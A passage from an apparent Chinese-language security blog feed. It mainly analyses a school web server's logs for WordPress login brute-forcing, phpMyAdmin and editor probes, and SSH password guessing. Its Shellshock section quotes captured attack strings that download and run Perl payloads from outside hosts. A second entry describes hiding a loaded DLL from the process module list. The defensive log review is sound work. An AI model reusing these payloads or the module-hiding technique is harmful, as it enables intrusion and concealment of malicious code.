    &lt;span class="m"&gt;584&lt;/span&gt; Mozilla/5.0 &lt;span class="o"&gt;(&lt;/span&gt;compatible&lt;span class="p"&gt;;&lt;/span&gt; bingbot/2.0&lt;span class="p"&gt;;&lt;/span&gt; +http://www.bing.com/bingbot.htm&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;508&lt;/span&gt; Mozilla/5.0 &lt;span class="o"&gt;(&lt;/span&gt;Windows NT &lt;span class="m"&gt;6&lt;/span&gt;.1&lt;span class="p"&gt;;&lt;/span&gt; WOW64&lt;span class="o"&gt;)&lt;/span&gt; AppleWebKit/537.36 &lt;span class="o"&gt;(&lt;/span&gt;KHTML, like Gecko&lt;span class="o"&gt;)&lt;/span&gt; Chrome/39.0.2171.95 Safari/537.36
    &lt;span class="m"&gt;491&lt;/span&gt; Mozilla/5.0 &lt;span class="o"&gt;(&lt;/span&gt;Macintosh&lt;span class="p"&gt;;&lt;/span&gt; Intel Mac OS X &lt;span class="m"&gt;10&lt;/span&gt;.10&lt;span class="p"&gt;;&lt;/span&gt; rv:35.0&lt;span class="o"&gt;)&lt;/span&gt; Gecko/20100101 Firefox/35.0
    &lt;span class="m"&gt;451&lt;/span&gt; Mozilla/5.0 &lt;span class="o"&gt;(&lt;/span&gt;Windows NT &lt;span class="m"&gt;6&lt;/span&gt;.1&lt;span class="p"&gt;;&lt;/span&gt; WOW64&lt;span class="p"&gt;;&lt;/span&gt; rv:31.0&lt;span class="o"&gt;)&lt;/span&gt; Gecko/20100101 Firefox/31.0
    &lt;span class="m"&gt;431&lt;/span&gt; Mozilla/5.0 &lt;span class="o"&gt;(&lt;/span&gt;Windows NT &lt;span class="m"&gt;6&lt;/span&gt;.1&lt;span class="o"&gt;)&lt;/span&gt; AppleWebKit/537.36 &lt;span class="o"&gt;(&lt;/span&gt;KHTML, like Gecko&lt;span class="o"&gt;)&lt;/span&gt; Chrome/39.0.2171.95 Safari/537.36
    &lt;span class="m"&gt;407&lt;/span&gt; Mozilla/5.0 &lt;span class="o"&gt;(&lt;/span&gt;Windows NT &lt;span class="m"&gt;6&lt;/span&gt;.1&lt;span class="p"&gt;;&lt;/span&gt; WOW64&lt;span class="o"&gt;)&lt;/span&gt; AppleWebKit/537.36 &lt;span class="o"&gt;(&lt;/span&gt;KHTML, like Gecko&lt;span class="o"&gt;)&lt;/span&gt; Chrome/40.0.2214.91 Safari/537.36
&lt;/pre&gt;&lt;/div&gt;


&lt;!--more--&gt;

&lt;h2&gt;其中最大宗的是來 try &lt;code&gt;wp-login&lt;/code&gt; 的...&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cat school-access.log &lt;span class="p"&gt;|&lt;/span&gt; grep -e &lt;span class="s1"&gt;&amp;#39;POST \/\+wp-login&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; wc -l
&lt;span class="m"&gt;54473&lt;/span&gt;
$ log-cat.py &lt;span class="s2"&gt;&amp;quot;{0}&amp;quot;&lt;/span&gt; school-access.log &lt;span class="p"&gt;|&lt;/span&gt; sort &lt;span class="p"&gt;|&lt;/span&gt; uniq -c &lt;span class="p"&gt;|&lt;/span&gt; sort -nr &lt;span class="p"&gt;|&lt;/span&gt; head -n &lt;span class="m"&gt;16&lt;/span&gt;
  &lt;span class="m"&gt;48381&lt;/span&gt; &lt;span class="m"&gt;80&lt;/span&gt;.237.75.2
   &lt;span class="m"&gt;3280&lt;/span&gt; &lt;span class="m"&gt;77&lt;/span&gt;.72.147.39
   &lt;span class="m"&gt;2716&lt;/span&gt; &lt;span class="m"&gt;74&lt;/span&gt;.7.97.202
   &lt;span class="m"&gt;1684&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;.162.50.120
   &lt;span class="m"&gt;1557&lt;/span&gt; &lt;span class="m"&gt;39&lt;/span&gt;.8.188.89
   &lt;span class="m"&gt;1266&lt;/span&gt; &lt;span class="m"&gt;124&lt;/span&gt;.12.208.13
   &lt;span class="m"&gt;1067&lt;/span&gt; ::1
    &lt;span class="m"&gt;854&lt;/span&gt; &lt;span class="m"&gt;60&lt;/span&gt;.250.33.110
    &lt;span class="m"&gt;732&lt;/span&gt; &lt;span class="m"&gt;180&lt;/span&gt;.177.122.206
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;phpMyAdmin setup.php、fckeditor、ewebeditor、找後台&lt;/h2&gt;
&lt;p&gt;大概分為以下四種&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;phpMyAdmin&lt;/code&gt; 的 &lt;code&gt;setup.php&lt;/code&gt; 有一大堆洞不解釋...&lt;/li&gt;
&lt;li&gt;&lt;code&gt;fckeditor&lt;/code&gt; 的檔案上傳&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ewebeditor&lt;/code&gt; 是一個來自左岸的 WYSIWYG Editor，也有很多洞&lt;/li&gt;
&lt;li&gt;單純自動掃 &lt;code&gt;/admin&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在此提醒， &lt;code&gt;phpMyAdmin&lt;/code&gt; 裝好之後記得要刪掉 &lt;code&gt;setup.php&lt;/code&gt; ，另外也記得不要用太常見的路徑，如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;phpmyadmin&lt;/li&gt;
&lt;li&gt;phpMyAdmin&lt;/li&gt;
&lt;li&gt;myadmin&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;之類的名稱&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cat school-access.log &lt;span class="p"&gt;|&lt;/span&gt; grep -i -e &lt;span class="s1"&gt;&amp;#39;admin&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; grep -v -e &lt;span class="s2"&gt;&amp;quot;\/wp-\|&lt;/span&gt;&lt;span class="nv"&gt;$HIDE_SIG&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; log-cat.py &lt;span class="s2"&gt;&amp;quot;{4}&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sort &lt;span class="p"&gt;|&lt;/span&gt; uniq -c &lt;span class="p"&gt;|&lt;/span&gt; sort -nr &lt;span class="p"&gt;|&lt;/span&gt; head -n &lt;span class="m"&gt;40&lt;/span&gt;
    &lt;span class="m"&gt;108&lt;/span&gt; GET /phpMyAdmin/scripts/setup.php HTTP/1.1
     &lt;span class="m"&gt;39&lt;/span&gt; GET /myadmin/scripts/setup.php HTTP/1.1
     &lt;span class="m"&gt;15&lt;/span&gt; GET //phpMyAdmin/scripts/setup.php HTTP/1.1
     &lt;span class="m"&gt;14&lt;/span&gt; GET //phpmyadmin/scripts/setup.php HTTP/1.1
     &lt;span class="m"&gt;14&lt;/span&gt; GET //myadmin/scripts/setup.php HTTP/1.1
     &lt;span class="m"&gt;14&lt;/span&gt; GET //MyAdmin/scripts/setup.php HTTP/1.1
      &lt;span class="m"&gt;7&lt;/span&gt; GET /phpmyadmin/scripts/setup.php HTTP/1.1
      &lt;span class="m"&gt;7&lt;/span&gt; GET /MyAdmin/scripts/setup.php HTTP/1.1
      &lt;span class="m"&gt;6&lt;/span&gt; HEAD /webadmin/fckeditor/editor/ HTTP/1.1
      &lt;span class="m"&gt;3&lt;/span&gt; HEAD /phpMyAdmin/ HTTP/1.1
      &lt;span class="m"&gt;3&lt;/span&gt; HEAD /admin/editor/editor/ HTTP/1.1
      &lt;span class="m"&gt;3&lt;/span&gt; HEAD /admin/editor/ HTTP/1.1
      &lt;span class="m"&gt;3&lt;/span&gt; HEAD /admin HTTP/1.1
      &lt;span class="m"&gt;3&lt;/span&gt; GET /phpmyadmin/scripts/setup.php HTTP/1.0
      &lt;span class="m"&gt;2&lt;/span&gt; HEAD /admin_article HTTP/1.1
      &lt;span class="m"&gt;2&lt;/span&gt; HEAD /admin/system/editor/FCKeditor/editor/ HTTP/1.1
      &lt;span class="m"&gt;2&lt;/span&gt; HEAD /admin/ewebeditor/ HTTP/1.1
      &lt;span class="m"&gt;2&lt;/span&gt; GET /phpMyAdmin/scripts/setup.php HTTP/1.0
      &lt;span class="m"&gt;1&lt;/span&gt; HEAD /wenadmin HTTP/1.1
      &lt;span class="m"&gt;1&lt;/span&gt; HEAD /webadmin HTTP/1.1
      &lt;span class="m"&gt;1&lt;/span&gt; HEAD /web_admin HTTP/1.1
      &lt;span class="m"&gt;1&lt;/span&gt; HEAD /sysadmin/fckeditor/editor/ HTTP/1.1
      &lt;span class="m"&gt;1&lt;/span&gt; HEAD /sysadmin HTTP/1.1
      &lt;span class="m"&gt;1&lt;/span&gt; HEAD /lists/admin/FCKeditor/editor/ HTTP/1.1
      &lt;span class="m"&gt;1&lt;/span&gt; HEAD /admin_article/fckeditor/editor/ HTTP/1.1
      &lt;span class="m"&gt;1&lt;/span&gt; HEAD /admin/webeditor/ HTTP/1.1
      &lt;span class="m"&gt;1&lt;/span&gt; HEAD /admin/webedit/ HTTP/1.1
      &lt;span class="m"&gt;1&lt;/span&gt; HEAD /admin/web_editor/ HTTP/1.1
      &lt;span class="m"&gt;1&lt;/span&gt; HEAD /admin/htmledit/ HTTP/1.1
      &lt;span class="m"&gt;1&lt;/span&gt; HEAD /admin/fckeditor/editor/ HTTP/1.1
      &lt;span class="m"&gt;1&lt;/span&gt; HEAD /admin/fckeditor/editor HTTP/1.1
      &lt;span class="m"&gt;1&lt;/span&gt; HEAD /admin/fckedit/editor/ HTTP/1.1
      &lt;span class="m"&gt;1&lt;/span&gt; HEAD /admin/eWebEditor/ HTTP/1.1
      &lt;span class="m"&gt;1&lt;/span&gt; HEAD /_admin/fckeditor/editor/ HTTP/1.1
      &lt;span class="m"&gt;1&lt;/span&gt; HEAD /Infoadmin/ewebeditor/ HTTP/1.1
      &lt;span class="m"&gt;1&lt;/span&gt; HEAD /INFOADMIN/eWebeditor/ HTTP/1.1
      &lt;span class="m"&gt;1&lt;/span&gt; HEAD /Administrator_School/EwebEditor/ HTTP/1.1
      &lt;span class="m"&gt;1&lt;/span&gt; GET /phpmyadmin2/main.php HTTP/1.0
      &lt;span class="m"&gt;1&lt;/span&gt; GET /phpmyadmin/main.php HTTP/1.0
      &lt;span class="m"&gt;1&lt;/span&gt; GET /phpmyadmin//setup/config.php?type&lt;span class="o"&gt;=&lt;/span&gt;post HTTP/1.1
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Shell Shock&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://en.wikipedia.org/wiki/Shellshock_%28software_bug%29"&gt;shellshock on Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cat school-access.log &lt;span class="p"&gt;|&lt;/span&gt; grep -e &lt;span class="s1"&gt;&amp;#39;curl\|wget\|perl\|python&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; grep -v -e &lt;span class="s1"&gt;&amp;#39;curl\/&amp;#39;&lt;/span&gt;
&lt;span class="m"&gt;87&lt;/span&gt;.106.95.7 - - &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;19&lt;/span&gt;/Feb/2015:05:05:58 +0800&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GET HTTP/1.1 HTTP/1.1&amp;quot;&lt;/span&gt; &lt;span class="m"&gt;400&lt;/span&gt; &lt;span class="m"&gt;392&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;-&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;() { :;};/usr/bin/perl -e &amp;#39;print \&amp;quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\&amp;quot;;system(\&amp;quot;wget http://202.202.121.27/core -O /tmp/core;wget http://202.202.121.27/core -O /dev/shm/core; curl -O /dev/shm http://202.202.121.27/core;curl -O /tmp/core http://202.202.121.27/core;perl /tmp/core;perl /dev/shm/core;rm -rf /tmp/core*;rm -rf /dev/shm/core*\&amp;quot;);&amp;#39;&amp;quot;&lt;/span&gt;
&lt;span class="m"&gt;108&lt;/span&gt;.61.212.127 - - &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;08&lt;/span&gt;/Feb/2015:23:58:26 +0800&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GET HTTP/1.1 HTTP/1.1&amp;quot;&lt;/span&gt; &lt;span class="m"&gt;400&lt;/span&gt; &lt;span class="m"&gt;485&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;-&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;() { :;};/usr/bin/perl -e &amp;#39;print \&amp;quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\&amp;quot;;system(\&amp;quot;wget http://play.marketplay.eu/apache23 -O /tmp/apache23;curl -O /tmp/apache23 http://play.marketplay.eu/apache23;chmod 777 /tmp/apache23;cd /tmp/;./apache23 &amp;amp;\&amp;quot;);&amp;#39;&amp;quot;&lt;/span&gt;
&lt;span class="m"&gt;69&lt;/span&gt;.162.105.66 - - &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;14&lt;/span&gt;/Feb/2015:04:22:32 +0800&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GET HTTP/1.1 HTTP/1.1&amp;quot;&lt;/span&gt; &lt;span class="m"&gt;400&lt;/span&gt; &lt;span class="m"&gt;392&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;-&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;() { :;};/usr/bin/perl -e &amp;#39;print \&amp;quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\&amp;quot;;system(\&amp;quot;wget http://217.113.112.248/ou -O /tmp/b.pl;curl -O /tmp/b.pl http://217.113.112.248/ou;perl /tmp/b.pl;rm -rf /tmp/b.pl*\&amp;quot;);&amp;#39;&amp;quot;&lt;/span&gt;
&lt;span class="m"&gt;209&lt;/span&gt;.92.176.24 - - &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;14&lt;/span&gt;/Feb/2015:20:06:38 +0800&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GET HTTP/1.1 HTTP/1.1&amp;quot;&lt;/span&gt; &lt;span class="m"&gt;400&lt;/span&gt; &lt;span class="m"&gt;392&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;-&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;() { :;};/usr/bin/perl -e &amp;#39;print \&amp;quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\&amp;quot;;system(\&amp;quot;rm -rf /tmp/l.pl*;wget http://87.106.189.34/ou.pl -O /tmp/l.pl;curl -O /tmp/l.pl http://87.106.189.34/ou.pl;perl /tmp/l.pl;rm -rf l.pl**\&amp;quot;);&amp;#39;&amp;quot;&lt;/span&gt;
&lt;span class="m"&gt;54&lt;/span&gt;.175.72.187 - - &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;04&lt;/span&gt;/Feb/2015:06:59:11 +0800&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GET HTTP/1.1 HTTP/1.1&amp;quot;&lt;/span&gt; &lt;span class="m"&gt;400&lt;/span&gt; &lt;span class="m"&gt;485&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;-&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;() { :;};/usr/bin/perl -e &amp;#39;print \&amp;quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\&amp;quot;;system(\&amp;quot;wget http://allproutah.com/t3.log -O /tmp/t3.log;curl -O /tmp/t3.log http://allproutah.com/t3.log;perl /tmp/t3.log;rm -rf /tmp/t3.log*\&amp;quot;);&amp;#39;&amp;quot;&lt;/span&gt;
&lt;span class="m"&gt;91&lt;/span&gt;.142.209.68 - - &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;30&lt;/span&gt;/Jan/2015:08:12:19 +0800&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GET HTTP/1.1 HTTP/1.1&amp;quot;&lt;/span&gt; &lt;span class="m"&gt;400&lt;/span&gt; &lt;span class="m"&gt;485&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;-&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;() { :;};/usr/bin/perl -e &amp;#39;print \&amp;quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\&amp;quot;;system(\&amp;quot;wget http://87.106.130.7/bou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://87.106.130.7/bou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*\&amp;quot;);&amp;#39;&amp;quot;&lt;/span&gt;
&lt;span class="m"&gt;89&lt;/span&gt;.152.241.67 - - &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;13&lt;/span&gt;/Dec/2014:02:15:23 +0800&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GET HTTP/1.1 HTTP/1.1&amp;quot;&lt;/span&gt; &lt;span class="m"&gt;400&lt;/span&gt; &lt;span class="m"&gt;485&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;-&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;() { :;};/usr/bin/perl -e &amp;#39;print \&amp;quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\&amp;quot;;system(\&amp;quot;wget www.freistilreisen.de/jack.jpg -O /tmp/jack.jpg;curl -O /tmp/jack.jpg www.freistilreisen.de/jack.jpg;perl /tmp/jack.jpg;rm -rf /tmp/jack.jpg*\&amp;quot;);&amp;#39;&amp;quot;&lt;/span&gt;
&lt;span class="m"&gt;61&lt;/span&gt;.182.202.57 - - &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;13&lt;/span&gt;/Dec/2014:12:02:23 +0800&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GET HTTP/1.1 HTTP/1.1&amp;quot;&lt;/span&gt; &lt;span class="m"&gt;400&lt;/span&gt; &lt;span class="m"&gt;485&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;-&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;() { :;};/usr/bin/perl -e &amp;#39;print \&amp;quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\&amp;quot;;system(\&amp;quot;wget http://210.230.186.9/icons/guide/jp.pl -O /tmp/jp.pl;curl -O /tmp/jp.pl http://210.230.186.9/icons/guide/jp.pl;fetch /tmp/jp.pl http://210.230.186.9/icons/guide/jp.pl;perl /tmp/jp.pl;rm -rf /tmp/jp.pl*\&amp;quot;);&amp;#39;&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;"the beast"&lt;/h3&gt;
&lt;p&gt;看起來應該是某些 server 預載了 &lt;code&gt;test-cgi&lt;/code&gt; 來告訴你 cgi-bin 能動了，應該是在打 shellshock 之前做測試&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;210.107.37.210 - - [20/Feb/2015:02:34:26 +0800] &amp;quot;GET /cgi-bin/test-cgi HTTP/1.1&amp;quot; 404 415 &amp;quot;-&amp;quot; &amp;quot;the beast&amp;quot;
140.115.17.214 - - [05/Feb/2015:07:10:15 +0800] &amp;quot;GET /cgi-bin/test-cgi HTTP/1.1&amp;quot; 404 508 &amp;quot;-&amp;quot; &amp;quot;the beast&amp;quot;
140.115.17.214 - - [26/Jan/2015:22:07:30 +0800] &amp;quot;GET /cgi-bin/test-cgi HTTP/1.1&amp;quot; 404 508 &amp;quot;-&amp;quot; &amp;quot;the beast&amp;quot;
218.25.54.25 - - [27/Jan/2015:03:14:32 +0800] &amp;quot;GET /cgi-bin/test-cgi HTTP/1.1&amp;quot; 404 508 &amp;quot;-&amp;quot; &amp;quot;the beast&amp;quot;
140.115.17.214 - - [30/Jan/2015:00:28:33 +0800] &amp;quot;GET /cgi-bin/test-cgi HTTP/1.1&amp;quot; 404 508 &amp;quot;-&amp;quot; &amp;quot;the beast&amp;quot;
198.211.30.100 - - [19/Jan/2015:09:55:07 +0800] &amp;quot;GET /cgi-bin/test-cgi HTTP/1.1&amp;quot; 404 508 &amp;quot;-&amp;quot; &amp;quot;the beast&amp;quot;
198.211.30.100 - - [23/Jan/2015:12:35:22 +0800] &amp;quot;GET /cgi-bin/test-cgi HTTP/1.1&amp;quot; 404 508 &amp;quot;-&amp;quot; &amp;quot;the beast&amp;quot;
198.211.30.100 - - [23/Jan/2015:17:46:57 +0800] &amp;quot;GET /cgi-bin/test-cgi HTTP/1.1&amp;quot; 404 508 &amp;quot;-&amp;quot; &amp;quot;the beast&amp;quot;
62.80.182.229 - - [18/Jan/2015:00:27:05 +0800] &amp;quot;GET /cgi-bin/test-cgi HTTP/1.1&amp;quot; 404 508 &amp;quot;-&amp;quot; &amp;quot;the beast&amp;quot;
198.211.30.100 - - [13/Dec/2014:19:19:59 +0800] &amp;quot;GET /cgi-bin/test-cgi HTTP/1.1&amp;quot; 404 508 &amp;quot;-&amp;quot; &amp;quot;the beast&amp;quot;
198.211.30.100 - - [06/Dec/2014:21:48:10 +0800] &amp;quot;GET /cgi-bin/test-cgi HTTP/1.1&amp;quot; 404 508 &amp;quot;-&amp;quot; &amp;quot;the beast&amp;quot;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;auth.log&lt;/h1&gt;
&lt;h2&gt;sshd&lt;/h2&gt;
&lt;p&gt;ssh 被 try 的數量也蠻多的，記得裝 fail2ban&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# 這些是存在的 User
$ cat-sys-log.sh /var/log auth.log | grep -e &amp;#39;^.\{15\} Parents sshd&amp;#39; | grep -e &amp;#39;\]: Failed password&amp;#39; | grep -v -e &amp;#39;\]: Failed password for invalid user&amp;#39; | awk &amp;#39;{ print $9 }&amp;#39; | sort | uniq -c | sort -nr
  16370 root
     60 www-data
     15 nobody
      7 lp
      7 backup
      6 games
      4 sshd
      3 bin
# 這些是不存在的 User
$ cat-sys-log.sh /var/log auth.log | grep -e &amp;#39;^.\{15\} Parents sshd&amp;#39; | grep -e &amp;#39;\]: Failed password for invalid user&amp;#39; | awk &amp;#39;{ print $11 }&amp;#39; | sort | uniq -c | sort -nr
    305 test
    199 nagios
    192 guest
    138 zabbix
    100 admin
     60 zxin10
     52 apache
     36 zhaowei
     33 PlcmSpIp
     32 web
     29 ubuntu
     28 cacti
     27 weblogic
     27 tomcat
     23 ftp
     21 squid
     18 webadmin
     18 Test
     16 r00t
     16 jboss
     16 java
     16 apache2
     15 oracle
     13 ubnt
     12 sysadmin
     12 httpd
     10 xbian
     10 pi
     10 info
      9 wangyi
      9 ts3
      9 nginx
      9 dff
      9 alex
      8 zhangyan
      8 jack
      7 support
      6 xiuzuan
      6 vyatta
      6 send
      6 log
      6 default
      5 xbmc
      5 ts
      5 teamspeak
      5 postgres
      5 git
      5 debug
      5 david
      5 christian
      5 boot
      5 aaron
      5 123456
      5 123
      4 webmail
      4 user
      4 smtp
      4 resin
      4 javaprg
      4 guestx
      4 guestuser
      4 guestadmin
      4 dreamer
      4 cisco
      4 cactiuser
      4 bob
      4 bash
      4 apache1
      3 ts3srv
      3 system
      3 staff
      3 sebastian
      3 sales
      3 nologin
      3 nagiosuser
      3 nagiosadmin
      3 karaf
      3 httpdocs
      3 httpd2
      3 hscroot
      3 ftpd
      3 ftp1
      2 john
      2 cusadmin
      2 administrator
      2 a
      1 xxxxxx
      1 unknown
      1 tech
      1 somesecguy
      1 shit
      1 root1
      1 kur
      1 iclock
      1 Fake
      1 chishin
      1 blank
      1 b
      1 arbab
      1 aditza
      1 00089
      1 0
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;以 IP 來看統計&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# 因為 list 太長，所以只列出大於 10 次的 IP
$ cat-sys-log.sh /var/log auth.log | grep -e &amp;#39;^.\{15\} Parents sshd&amp;#39; | grep -e &amp;#39;\]: Failed password for&amp;#39; | awk &amp;#39;{ if($10 == &amp;quot;from&amp;quot;) { print $11 } else if($10 == &amp;quot;user&amp;quot;) {print $13} }&amp;#39; | sort | uniq -c | sort -nr
   7099 14.63.73.40
   2252 218.61.196.203
   1794 154.120.226.38
    998 182.92.183.24
    921 115.231.222.176
    499 158.85.244.228
    355 59.160.98.144
    323 222.186.130.222
    321 222.186.56.44
    321 222.186.56.42
    321 222.186.134.7
    321 115.239.248.48
    321 111.74.238.15
    319 222.186.58.81
    319 222.186.56.33
    167 115.231.218.130
    165 115.231.218.131
    122 183.136.216.4
     90 115.239.228.34
     55 193.111.238.147
     46 162.213.25.67
     40 115.239.228.6
     33 94.136.45.178
     31 87.106.132.188
     31 115.239.228.7
     31 115.230.126.151
     30 222.161.4.147
     26 115.239.228.9
     26 115.239.228.13
     25 115.239.228.15
     25 115.231.222.45
     23 115.239.228.4
     22 183.136.216.3
     20 115.239.228.16
     19 222.161.4.149
     19 103.41.124.111
     18 115.239.228.35
     17 115.239.228.11
     16 115.239.228.14
     14 183.136.216.6
     13 58.218.213.238
     13 115.239.228.12
     12 106.39.255.243
     11 222.161.209.92
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Attachments&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/Inndy/1d30d6d528babde6df47"&gt;log-cat.py&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Inndy/cli-tools/blob/master/cat-sys-log.sh"&gt;cat-sys-log.sh&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content></entry><entry><title>找出所有已經載入的DLL以及隱藏已經載入的DLL</title><link href="https://blog.inndy.tw/2014/02/15/process-module-enumerating-and-hiding/" rel="alternate"></link><published>2014-02-15T12:20:00+08:00</published><updated>2014-02-15T12:20:00+08:00</updated><author><name>Inndy</name></author><id>tag:blog.inndy.tw,2014-02-15:/2014/02/15/process-module-enumerating-and-hiding/</id><summary type="html">&lt;p&gt;從PEB結構體裡面找出所有已經載入的DLL，以及隱藏的方法
可以用在什麼地方就不解釋了....XD&lt;/p&gt;
&lt;p&gt;參考資料：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://bbs.pediy.com/showthread.php?t=124325"&gt;http://bbs.pediy.com/showthread.php?t=124325&lt;/a&gt; （看雪學院 ）&lt;/li&gt;
&lt;li&gt;&lt;a href="http://msdn.moonsols.com/"&gt;http://msdn.moonsols.com/&lt;/a&gt; （裡面有很多 Windows Structures 的資料）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;原文是 masm 寫的，我用 C++ 寫了一個&lt;/p&gt;
&lt;p&gt;&lt;img alt="Q7I6zge.png" src="/images/2014-02-15-process-module-enumerating-and-hiding--f6e57768--Q7I6zge.png"&gt;&lt;/p&gt;
&lt;p&gt;（不知道為什麼副檔名.c餵給cl就編不過了...Q____Q，所以說是C++）&lt;/p&gt;
&lt;!--more--&gt;

&lt;p&gt;隱藏的部分大概就斷Link、抹除DLL Name和DLL Path、抹掉PE signature
缺點是可能會造成DLL重載、GetModuleHandle抓不到
（反正就說要隱藏了嘛哈哈哈哈）
不過應該還沒有完全隱藏起來，GetModuleHandle還是會掃過...明明Link都斷掉了阿 OTZ
後來發現不能把整個structure給填0，後面如果用到GetModuleHandle會crash
發生的記憶體存取錯誤的地方也附上了，但是有點懶得繼續追
如果有人找到GetModuleHandle用的Link在哪裡的話記得告訴我 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;從PEB結構體裡面找出所有已經載入的DLL，以及隱藏的方法
可以用在什麼地方就不解釋了....XD&lt;/p&gt;
&lt;p&gt;參考資料：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://bbs.pediy.com/showthread.php?t=124325"&gt;http://bbs.pediy.com/showthread.php?t=124325&lt;/a&gt; （看雪學院 ）&lt;/li&gt;
&lt;li&gt;&lt;a href="http://msdn.moonsols.com/"&gt;http://msdn.moonsols.com/&lt;/a&gt; （裡面有很多 Windows Structures 的資料）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;原文是 masm 寫的，我用 C++ 寫了一個&lt;/p&gt;
&lt;p&gt;&lt;img alt="Q7I6zge.png" src="/images/2014-02-15-process-module-enumerating-and-hiding--f6e57768--Q7I6zge.png"&gt;&lt;/p&gt;
&lt;p&gt;（不知道為什麼副檔名.c餵給cl就編不過了...Q____Q，所以說是C++）&lt;/p&gt;
&lt;!--more--&gt;

&lt;p&gt;隱藏的部分大概就斷Link、抹除DLL Name和DLL Path、抹掉PE signature
缺點是可能會造成DLL重載、GetModuleHandle抓不到
（反正就說要隱藏了嘛哈哈哈哈）
不過應該還沒有完全隱藏起來，GetModuleHandle還是會掃過...明明Link都斷掉了阿 OTZ
後來發現不能把整個structure給填0，後面如果用到GetModuleHandle會crash
發生的記憶體存取錯誤的地方也附上了，但是有點懶得繼續追
如果有人找到GetModuleHandle用的Link在哪裡的話記得告訴我&lt;/p&gt;
